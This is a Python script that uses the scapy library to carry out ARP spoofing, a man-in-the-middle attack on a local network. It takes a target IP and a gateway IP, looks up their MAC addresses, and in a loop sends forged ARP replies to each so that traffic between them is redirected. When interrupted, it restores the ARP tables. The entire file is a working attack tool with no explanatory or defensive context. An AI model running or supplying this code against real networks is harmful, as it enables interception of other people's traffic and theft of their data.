#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Target Gateway.")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

if target_ip or gateway_ip:
    pass
else:
    print("[-] Please use an IP address and a Gateway address.")
    exit()

if target_ip:
    pass
else:
    print("[-] Could not read IP address.")
    quit()

if gateway_ip:
    pass
else:
    print("[-] Could not read Gateway address.")
    quit()

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except IndexError:
    print("[-] Could not read IP address or Gateway address.")
    exit()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
